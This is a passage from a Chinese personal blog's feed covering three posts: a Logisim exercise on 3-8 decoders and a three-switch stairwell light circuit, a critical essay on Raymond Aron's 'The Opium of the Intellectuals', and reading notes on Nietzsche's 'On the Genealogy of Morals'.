class="mspace" style="margin-right:0.2778em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">2&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">1&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">0&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:2.8367em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/p>
&lt;p>通过 Logisim-Evolution 与布尔函数画出电路图并模拟运行如下：&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2024/04/10/9sJxlDupvgY1XHe.gif"
loading="lazy"
alt="3_8_Decoder_Properties.gif"
>&lt;/p>
&lt;p>由图可知，电路符合我们的要求。&lt;/p>
&lt;h2 id="使用-2-4-译码器实现-3-8-译码器">使用 2-4 译码器实现 3-8 译码器
&lt;/h2>&lt;p>这是一个 2-4 译码器的电路结构&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2024/04/10/iUgornTtQAvfDMY.png"
loading="lazy"
alt="2_to_4_Decoder.png"
>&lt;/p>
&lt;p>现在我们需要用两个 2-4 译码器来实现一个 3-8 译码器。既然作为输入信号的八个三位二次元组合 $000,001,\dots,111$ 对应着八个仅一个对应的输出端为高电位的结果，我们可以将这八位输出端分割为高四位与低四位，分别由两个 2-4 译码器来控制。&lt;/p>
&lt;p>但是因为在我们这里，译码器的输出会且仅仅出现一个 $1$ ，而两个译码器的输出拼接会产生两个 $1$ 出来 (例如 $0010\ 0100$)，这样的结果不符合我们对译码器输出的要求，因此我们需要给两个译码器分别安装一个使能端，在同一时间内，只能有一个使能端开启，即同一时间内只能有一个译码器为激活状态，而未激活的译码器结果应输出 $0000$.&lt;/p>
&lt;p>假设高四位译码器的使能端接收信号记作 $E_H$，输出的四位信号记作 $O_H$，输出结果对应的二位输入为 $I&amp;rsquo;_H$， 低四位的使能端记作 $E_L$，输出记作 $O_L$ ，输出结果对应的二位输入为 $I&amp;rsquo;_L$，三位输入记作 $I_0,I_1,I_2$，则相应的真值表如下：&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Index&lt;/th>
&lt;th>$I_2$&lt;/th>
&lt;th>$I_1$&lt;/th>
&lt;th>$I_0$&lt;/th>
&lt;th>$E_H$&lt;/th>
&lt;th>$E_L$&lt;/th>
&lt;th>$O_H$&lt;/th>
&lt;th>$O_L$&lt;/th>
&lt;th>$I&amp;rsquo;_H$&lt;/th>
&lt;th>$I&amp;rsquo;_L$&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0000&lt;/td>
&lt;td>0001&lt;/td>
&lt;td>X&lt;/td>
&lt;td>00&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0000&lt;/td>
&lt;td>0010&lt;/td>
&lt;td>X&lt;/td>
&lt;td>01&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>2&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0000&lt;/td>
&lt;td>0100&lt;/td>
&lt;td>X&lt;/td>
&lt;td>10&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>3&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0000&lt;/td>
&lt;td>1000&lt;/td>
&lt;td>X&lt;/td>
&lt;td>11&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>4&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0001&lt;/td>
&lt;td>0000&lt;/td>
&lt;td>00&lt;/td>
&lt;td>X&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>5&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0010&lt;/td>
&lt;td>0000&lt;/td>
&lt;td>01&lt;/td>
&lt;td>X&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>6&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0100&lt;/td>
&lt;td>0000&lt;/td>
&lt;td>10&lt;/td>
&lt;td>X&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>7&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1000&lt;/td>
&lt;td>0000&lt;/td>
&lt;td>11&lt;/td>
&lt;td>X&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>观察真值表，我们可以得到一些重要性质，这对我们设计电路有巨大作用：&lt;/p>
&lt;ol>
&lt;li>当 $I_2$ 为低电位， $E_H$ 关闭， $E_L$ 开启，当 $I_2$ 为高电位， $E_H$ 开启， $E_L$ 关闭&lt;/li>
&lt;li>$I&amp;rsquo;_H$ 与 $I&amp;rsquo;_L$ （如果使能端未关闭） 的组合始终与 $I_1I_0$ 的组合相同&lt;/li>
&lt;/ol>
&lt;p>综上，我们可以直接将 $I_0$ 与 $I_1$ 都同时接入两个译码器，同时引入 $I_2$ 作为使能端，一个取反值接入低四位译码器，另一个取原值接入高四位译码器。电路图如下：&lt;/p>
&lt;p>首先是安装使能端的 2-4 译码器&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2024/04/10/v9PTupAzo3KD5f6.png"
loading="lazy"
alt="2_to_4_Decoder_with_Enabler.png"
>&lt;/p>
&lt;p>以及由其构造的 3-8 译码器&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2024/04/10/Vk9l6C5eIWaQ2nD.gif"
loading="lazy"
alt="3_8_By_2_4_Decoder_Properties.gif"
>&lt;/p>
&lt;h2 id="借助-3-8-译码器进行楼道灯控制">借助 3-8 译码器进行楼道灯控制
&lt;/h2>&lt;p>楼道灯控制是指：在一个楼道中，有三个开关控制一盏灯是否亮，且改变其中任意一个开关的状态时，灯的状态都会随之改变。&lt;/p>
&lt;p>例如，若某一时刻时，三个开关的状态分别是闭合、断开、闭合，而此时灯灭，则此时，将任意一个闭合的开关断开，或者将任意一个断开的开关闭合，则灯亮（即三个开关均闭合，或三个开关的状态分别为闭合、断开、断开，或三个开关的状态分别为断开、断开、闭合时，灯均亮）&lt;/p>
&lt;p>听起来有点像异或：每当有一位输入的信号改变，最后输出的1位信号都要改变。但是我们这里需要使用 3-8 译码器，一个直观的思路就是通过译码器的 8 位输出来控制灯的开关。注意到改变其中任意一个开关的状态，相当于将输入的二次元组合转为另一个相邻的二次元组合，这让我们想到格雷码，进而发现，假如我们将灯的开关状态作为一个关于 $I_0,I_1,I_2$ 的布尔函数，可以做出一个卡诺图：&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>$I_0$ / $I_1,I_2$&lt;/th>
&lt;th>00&lt;/th>
&lt;th>01&lt;/th>
&lt;th>11&lt;/th>
&lt;th>10&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>0&lt;/td>
&lt;td>$1_0$&lt;/td>
&lt;td>$0_1$&lt;/td>
&lt;td>$1_3$&lt;/td>
&lt;td>$0_2$&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>$0_4$&lt;/td>
&lt;td>$1_5$&lt;/td>
&lt;td>$0_7$&lt;/td>
&lt;td>$1_6$&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>因此，我们可以将 $O_0, O_3, O_5, O_6$ 接入一个或门，用于控制灯的开关，另外四个信号作为无用信号排除。&lt;/p>
&lt;p>得到的电路图如下：&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2024/04/10/7Jw28MHLYXAgveZ.gif"
loading="lazy"
alt="3_8_light_control.gif"
>&lt;/p></description></item><item><title>天气预报员不能改变天气 ————读《知识分子的鸦片》</title><link>https://nepl1t.github.io/p/%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5%E5%91%98%E4%B8%8D%E8%83%BD%E6%94%B9%E5%8F%98%E5%A4%A9%E6%B0%94-%E8%AF%BB%E7%9F%A5%E8%AF%86%E5%88%86%E5%AD%90%E7%9A%84%E9%B8%A6%E7%89%87/</link><pubDate>Wed, 17 Jan 2024 11:14:25 +0800</pubDate><guid>https://nepl1t.github.io/p/%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5%E5%91%98%E4%B8%8D%E8%83%BD%E6%94%B9%E5%8F%98%E5%A4%A9%E6%B0%94-%E8%AF%BB%E7%9F%A5%E8%AF%86%E5%88%86%E5%AD%90%E7%9A%84%E9%B8%A6%E7%89%87/</guid><description>&lt;img src="https://tse1-mm.cn.bing.net/th/id/OIP-C.txr2PFDLpE7uIBsfYge5kQHaEz?rs=1&amp;pid=ImgDetMain" alt="Featured image of post 天气预报员不能改变天气 ————读《知识分子的鸦片》" />&lt;p>“‘左派’、‘革命’、‘无产阶级’，这些流行的概念乃是政治乐观主义的重要神话‘进步’、‘理性’、‘人民’的为时已晚的复制品”&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>，从雷蒙·阿隆在他的大作《知识分子的鸦片》中做出的这一论断里，我们可以发现他尝试将“解放话语”的马克思主义与源自启蒙运动时期的进步主义思想相联系。&lt;/p>
&lt;p>事实上，他确实是这样做的。《知识分子的鸦片》第一章“政治的神话”由三个部分构成：“左派的神话”、“革命的神话”与“无产阶级的神话”。而在“左派的神话”一节中，阿隆就已经从大革命时主张“法律面前人人平等”的左派，大革命后在共和国与君主制徘徊不决的左派，与后来反对资产阶级的左派的演变中总结出所谓“左派无限可分”的观点了。然而，这样的新旧左派的指导思想和追求目标终究是不同的。“在自命为左派的不同群体之间，从未有过深刻的统一性”，而左派们虽然“可能消灭一种与某种经济运行方式联系在一起的不平等，但他们又会自动地重建另一种不平等”。在“革命的神话”中，阿隆认为“所谓的无产阶级革命，如同过去所有革命一样，只是由一个精英集团通过暴力取代另一个精英集团。这样的革命并未呈现出任何非同寻常的特征，能使人借此欢呼‘史前史的结束’”，而法国人之所以热衷于革命，只是他们希望藉由革命“延长或再现往昔的荣耀”罢了。“革命的概念表达了一种怀旧情绪，只要社会不够完美，只要人们仍旧渴望改革，这种怀旧情绪就会长久不衰”&lt;sup id="fnref:2">&lt;a href="#fn:2" class="footnote-ref" role="doc-noteref">2&lt;/a>&lt;/sup>。&lt;/p>
&lt;p>而在“无产阶级的神话”一章中，他对传统马克思主义的解放理论和无产阶级在“资本主义末世论”中扮演的救世主之形象的批评也颇具创见。&lt;em>“为什么无产阶级必须是革命者呢？”&lt;/em>&lt;sup id="fnref:3">&lt;a href="#fn:3" class="footnote-ref" role="doc-noteref">3&lt;/a>&lt;/sup>阿隆如此问道。尽管无产阶级毫无疑问是资本主义的产物，因为只有资本主义，直接造成了无产阶级作为直接生产者与生产资料所有权之间的分离&lt;sup id="fnref:4">&lt;a href="#fn:4" class="footnote-ref" role="doc-noteref">4&lt;/a>&lt;/sup>，然而这只能表明无产阶级在资本主义社会中是一个特殊的主体，并不代表无产阶级一定要以革命者的身份出现。在这里，雷蒙·阿隆举出了美国的无产阶级为例：“在那里，工人组织要求并获得了欧洲人认为是属于福利国家或社会主义的许多改革。群众的领导者们对现行制度给予他们的地位感到满意，而群众本身也不渴望另一个社会或是另一种价值观”&lt;sup id="fnref:5">&lt;a href="#fn:5" class="footnote-ref" role="doc-noteref">5&lt;/a>&lt;/sup>。因此，无产阶级不总是革命的。不是所有的无产阶级者都能感到自己是被剥削压迫的一方，而他们自然也不大懂得要起来反抗的道理。一方面，平凡的出生有很大可能将无产阶级推到日子人的一方，而生活水平的提高与工业生产逐渐“人道化”（相较以前而言）也会缓和无产阶级的反叛情绪。&lt;/p>
&lt;p>更何况，在阿隆看来，无产阶级的界定问题，也是一个充满争议的论题：一个雷诺汽车厂的机械师与流水线上的工人，虽然干的都是体力活，但是工资千差万别，那么他是所谓无产阶级吗？以至于自视为革命领导者的法国左派知识分子们不得不宣称，“无产阶级必须具有革命性，否则他就没有理由存在”。比如萨特就说“无产阶级的统一性，完全取决于它与社会上其他阶级的关系，简而言之，完全取决于他的斗争”&lt;sup id="fnref:6">&lt;a href="#fn:6" class="footnote-ref" role="doc-noteref">6&lt;/a>&lt;/sup>对他们来说，重要的不是无产阶级这一范畴能否代表绝大多数人（无产阶级自己），也并不是人数的多少，而是“具有战斗精神的少数人能够合法的代表整个无产阶级”；而他们之所以要起来斗争，并非是为了他们自己，而是为了所有的人。&lt;/p>
&lt;p>但是，阿隆自己在马克思主义的研究角度本身就带有较大的偏见和臆断，也许这看起来并不是他的本意，但是考虑到此书是作为一篇论战檄文而作，我完全可以怀疑阿隆故意将错就错，为了方便射击而自立靶子。阿隆所谓的“马克思主义”和“马克思主义的历史哲学”，实质上来说是苏联官方陷入形而上学陷阱下的教条主义，这种教条主义的思想体系将马克思主义简单化、庸俗化成了一种绝对的真理体系，并基于此构造出了所谓充斥着历史决定论的、“无产阶级的末世论角色”的神话叙事。而苏联的绝对真理体系也深刻影响了当时的法国知识分子，导致其思想上产生种种误区。而路易·阿尔都塞，典型的左翼法国知识分子，则对这种神话叙事果断地做出了批判：只有唯心主义者才会试图把自己的学说视为一种绝对的开始建构出来的绝对的真理体系，认为历史运动有着绝对的开始与结束，是“理性与解放”图式绘制出的基本矛盾但展开，而历史唯物主义仅仅认为历史有一种由结构的总体多元决定的趋势——其从未有这些绝对的起点与终点。&lt;sup id="fnref:7">&lt;a href="#fn:7" class="footnote-ref" role="doc-noteref">7&lt;/a>&lt;/sup>因此我们在此能够看出雷蒙·阿隆在这方面的自相矛盾：一方面，他指出左派知识分子之间的差异极大，而在另一方面，他在法国左翼知识分子的批评中，又一股脑地给他们全扣上了“亲苏派”的帽子，忽视了自己先前提到的知识分子的个体差异性。&lt;/p>
&lt;p>例如说，还是路易·阿尔都塞，被雷蒙·阿隆多次“点名批评”的他，就曾不止一次对阿隆笔下的“政治乐观主义”的绝对真理体系提出批评。雷蒙·阿隆写道，“左派的乐观主义是由这样一种强烈情感——即赞美理性的力量，确信科学之应用于工业将彻底改变集体秩序和个体处境——所产生与维系”。&lt;sup id="fnref:8">&lt;a href="#fn:8" class="footnote-ref" role="doc-noteref">8&lt;/a>&lt;/sup>而在阿尔都塞看来，这种乐观主义实质上是资产阶级的哲学，而在本质上是一种主体哲学，倡导的是一种理论的人道主义。&lt;sup id="fnref:9">&lt;a href="#fn:9" class="footnote-ref" role="doc-noteref">9&lt;/a>&lt;/sup>马克思早期也是深陷在这种理论的泥淖中, 以为理性加自由的模式能够解决现实的一切困难。在经历了一系列社会、政治的嬗变之后, 马克思彻底地看清了这种理论本身的神秘性, 即以一种抽象的、思辨的方式来塑造人, 从而在一种缺乏历史和现实内容的论述中虚假地倡导人的价值及其实现。&lt;sup id="fnref:10">&lt;a href="#fn:10" class="footnote-ref" role="doc-noteref">10&lt;/a>&lt;/sup>众所周知，马克思主义从来不是什么绝对的真理体系，而是一种发展的科学，其众多经典的结论，例如马克思关于经济基础和上层建筑的论断：“在不同的所有制形式上，在生存的社会条件上，耸立着由各种不同情感、幻想、思想方式和世界观构成的整个上层建筑。整个阶级在它的物质条件和相应的社会关系的基础上创造和构成这一切。”&lt;sup id="fnref:11">&lt;a href="#fn:11" class="footnote-ref" role="doc-noteref">11&lt;/a>&lt;/sup>，大多是由描述性的语言表述的，而苏联人却将这种本应作为理论起点的特定理论简单粗暴地视作放之四海皆准的真理。&lt;/p>
&lt;p>再者，尽管阿隆冷静地指出了当时的法国左翼知识分子对共产主义运动前景的过分乐观并予以正确的批评，但笔者还是不免感到，他对资本主义社会现实的认识似乎还是肤浅了点，换句话说，是反而对自由主义的发展前景过分乐观了。阿隆最终选择将未来交付于怀疑主义，这固然是平息意识形态狂热的一个途径，但在当下看来，普遍的怀疑和解构共产主义宏大叙事后的新自由主义带来的并不是有理智的信仰或者审慎的怀疑主义，而是更为严重的虚无主义与普遍性、系统性的信仰危机。而相对应的，以福山为代表的知识分子们又转而将自由主义给宏大叙事化了——“上帝之死在人的灵魂中留下了一片空白，但是内心需要依旧存在，需要一种新的基督教来满足它。只有知识分子能够发明甚至宣传一种为学者所接受的旧信条的替代物”&lt;sup id="fnref:12">&lt;a href="#fn:12" class="footnote-ref" role="doc-noteref">12&lt;/a>&lt;/sup>，阿隆在这里深刻地洞见了他的时代，但也以一种可能并不是他想要的方式预言了将来的反复。与其说是一个“冷静旁观的介入者”，雷蒙·阿隆更像是一位天气预报员，能够精准地预测天气改变，但对现状无计可施。&lt;/p>
&lt;p>尽管当时那个意识形态做疾风暴雨般斗争的时代看起来是结束了，而政治乐观主义的乌托邦也被扫进了垃圾堆，阿隆在书中语言的新的时代，那个将政治当作致力于社会发展的努力和控制生活的艺术的，现实主义政治的时代看似到来了。但是，当我们请走了政治乐观主义的乌托邦后，引进家门似乎是全新的、现实主义的、娱乐至死的乌托邦。而人们的狂热，也早已从意识形态上转到消费、娱乐等其他的事物上去了。尽管现在的左翼有着鲍德里亚、朗西埃、齐泽克、阿甘本和巴迪欧等新一代的激进理论家，而他们“似乎已经建构了一种后马克思思潮的全新的资本主义批判尺度和另类先锋话语。”&lt;sup id="fnref:13">&lt;a href="#fn:13" class="footnote-ref" role="doc-noteref">13&lt;/a>&lt;/sup>，但无论是左派的他们还是右派的其他知识分子，其影响力和话语权都早已大不如前。我很好奇像雷蒙·阿隆这样，自我标榜着审慎理性、循序渐进的意识形态家要是来到现在的这个世界会作何反应，这样我们就能看出他所反对的到底是共产主义还是早已泛化的“狂热”本身了。&lt;/p>
&lt;div class="footnotes" role="doc-endnotes">
&lt;hr>
&lt;ol>
&lt;li id="fn:1">
&lt;p>雷蒙·阿隆：《知识分子的鸦片》，吕一民、顾杭译，南京：译林出版社，2012年，第88页&amp;#160;&lt;a href="#fnref:1" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;li id="fn:2">
&lt;p>雷蒙·阿隆：《知识分子的鸦片》，吕一民、顾杭译，南京：译林出版社，2012年，，第4页，第20页，第38页，第60页&amp;#160;&lt;a href="#fnref:2" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;li id="fn:3">
&lt;p>雷蒙·阿隆：《知识分子的鸦片》，吕一民、顾杭译，南京：译林出版社，2012年，第66页&amp;#160;&lt;a href="#fnref:3" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;li id="fn:4">
&lt;p>见《资本论》第一卷第二十四章：“资本关系以劳动者和劳动实现条件的所有权之间的分离为前提。资本主义生产一旦站稳脚跟，它就不仅保持这种分离，而且以不断扩大的规模再生产这种分离。因此，创造资本关系的过程，只能是劳动者和他的劳动条件的所有权分离的过程，这个过程一方面使社会的生活资料和生产资料转化为资本，另一方面使直接生产者转化为雇佣工人。”。《马克思恩格斯全集》第四十四卷，北京：人民出版社，2001年，第821页&amp;#160;&lt;a href="#fnref:4" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;li id="fn:5">
&lt;p>雷蒙·阿隆：《知识分子的鸦片》，吕一民、顾杭译，南京：译林出版社，2012年，第290页&amp;#160;&lt;a href="#fnref:5" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;li id="fn:6">
&lt;p>让-保罗·萨特：《共产主义者与和平》，载于《现代》1952年10-11月号&amp;#160;&lt;a href="#fnref:6" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;li id="fn:7">
&lt;p>F-Hreinskilin：如何评价雷蒙.阿隆的作品《知识分子的鸦片》？2023年9月23日，https://www.zhihu.com/question/35762706/answer/3223395957 ，2023年12月22日&amp;#160;&lt;a href="#fnref:7" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;li id="fn:8">
&lt;p>雷蒙·阿隆：《知识分子的鸦片》，吕一民、顾杭译，南京：译林出版社，2012年，第284页&amp;#160;&lt;a href="#fnref:8" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;li id="fn:9">
&lt;p>林青：《晚期阿尔都塞对“认识论断裂”的自我突破》，《哲学研究》2011年第4期&amp;#160;&lt;a href="#fnref:9" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;li id="fn:10">
&lt;p>路易·阿尔都塞：《自我批评论文集》，杜章智、沈起予译，台湾：远流出版事业股份有限公司，1990年，第81页&amp;#160;&lt;a href="#fnref:10" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;li id="fn:11">
&lt;p>马克思：《路易·波拿巴的雾月十八日》，《马克思恩格斯全集》第八卷，北京：人民出版社，2009年，第149页。&amp;#160;&lt;a href="#fnref:11" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;li id="fn:12">
&lt;p>雷蒙·阿隆：《知识分子的鸦片》，吕一民、顾杭译，南京：译林出版社，2012年，第261页&amp;#160;&lt;a href="#fnref:12" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;li id="fn:13">
&lt;p>张一兵：《无分之分：治安构序逻辑断裂中生成的失序政治——朗西埃后马克思生命政治哲学的异质走向》，《社会科学研究》2013年第1期&amp;#160;&lt;a href="#fnref:13" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;/div></description></item><item><title>《论道德的谱系》读书笔记 01</title><link>https://nepl1t.github.io/p/%E8%AE%BA%E9%81%93%E5%BE%B7%E7%9A%84%E8%B0%B1%E7%B3%BB%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-01/</link><pubDate>Wed, 22 Nov 2023 04:12:07 +0800</pubDate><guid>https://nepl1t.github.io/p/%E8%AE%BA%E9%81%93%E5%BE%B7%E7%9A%84%E8%B0%B1%E7%B3%BB%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-01/</guid><description>&lt;img src="https://s2.loli.net/2023/11/22/qnB4xvspbQUEVaN.png" alt="Featured image of post 《论道德的谱系》读书笔记 01" />&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">本文基于《论道德的谱系》商务印书馆 2018年版，赵千帆译本。
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="1">1
&lt;/h2>&lt;p>尼采在本书中的道德批评在其序言对人类有限性的论述中就可以窥知一二了。第一，他指出现代人早已失去了自我反思的动力，如《新约·马太全书》所写 “你的财宝在哪里，你的心也在哪里” ，人一心所想的即为 “把什么东西 ‘带回家去’ ” ，而人的生命就其本身而言，并非其所在意的地方。第二，他认为现代人即使拥有自我认识的意愿，也徒有是心而余力不足矣。他认为 “道德意涵在现代社会中的扭曲” 阻止了人这个类型达到它 “本身原来可能达到的某种最高级的强大与壮丽” ，不能做出正确的道德判断阻止了人进一步获得认识自己的能力。综上，尼采写道：“我们就是必然会对自己保持陌生，我们不理解我们自己，我们&lt;em>必须&lt;/em>混淆自己”。&lt;/p>
&lt;p>尼采的道德谱系学是以一个很 “尼采式” 的问题展开的，即 “我们的善和恶到底来自&lt;em>何种起源&lt;/em>？”，进一步准确论述，也就是 “人类是在何种方式下为自己发明的那些善恶价值判断的？” ；而在人的善恶价值判断起源问题之外，另外一个问题也显得同等重要：人的善恶价值是否有价值？&lt;/p>
&lt;p>很显然，我们都知道，尼采对后一个问题持强烈的否定态度。在序言里，他尤其是针对所谓 “非利己者” 的善，即：同情之本能、自我否定之本能、自我牺牲之本能，做出了激烈的批评：他认为这是 “意志转而反对生命” 的例子。在他看来，同情泛滥使得人放弃从自身寻找高贵和伟大的努力，转而用廉价的共感来帮助弱者，使得社会的道德风气变得靡乱不堪、软弱至极。而对同情的推崇像是一种瘟疫，侵袭了许多欧洲的哲学家，甚至大有要将欧洲文化转化为一种 “全新的佛教” ，径直通向虚无主义之势。同时期的哲学家们都十分重视同情或怜悯，而这反而是自古以来的哲学家们（尼采在这里取了柏拉图、斯宾诺莎、拉罗什福克、康德四个例子）所贬斥的。&lt;/p>
&lt;h3 id="柏拉图-对同情的驳斥">柏拉图 “对同情的驳斥”
&lt;/h3>&lt;p>柏拉图认为，人性中最美好的部分是由理性掌控的。而能熟练运用理性的人，便是所谓 “优秀的人” ，而面对不幸时，一个优秀的人，一个男子汉，以能听从理性的指导，以能压抑住本性中渴望痛哭流涕以求发泄的部分，“以能忍耐能保持平静而自豪” 。&lt;/p>
&lt;p>而剧场与诗歌 “在看别人的苦难，赞美而怜悯别人，宣扬自己的美德而又表演出极端苦痛” 。这种 “同情与怜悯” 情感的快感被释放之后，往往会被人&lt;em>不加反思&lt;/em>地加以吸收（因为戏剧不是自己的苦难，而吸收这种情感会让自己感到快乐）。这样的吸收会潜移默化地 “养肥” 我们的怜悯之情，到我们受苦的时候，想要痛苦发泄的本性就变得难以压制了：&lt;/p>
&lt;p>尽管柏拉图在这里主要是想表示，诗歌所包含的欲望与情感与他理想中的理性与秩序相抵触，会腐蚀个人的品性，以至于摧毁理性，但我们也可以看出，他在这里也暗自蕴含了对同情之心的驳斥。&lt;/p>
&lt;hr>
&lt;p>而同时，人们往往事先给道德价值予以无条件的肯定，以至于将对此的一切疑问推到 out of question 的境界。人们事先设定好了 “善人” 在价值上高于 “恶人” ，却没有对这种给定的价值评判本身的价值提出质疑。为此尼采特地提出，我们亟需一次对道德价值的批判，道德的价值本身首先是有待质问的：倘若现在的道德评判与事实真相相悖呢？倘若我们的 “善” 在短期内让人活得更加惬意安全，却正在长期内杀死我们呢？倘若道德让我们不能够达到人本能达到的强大境界， “以至于恰恰道德才是那些危险的危险之处呢？……”&lt;/p>
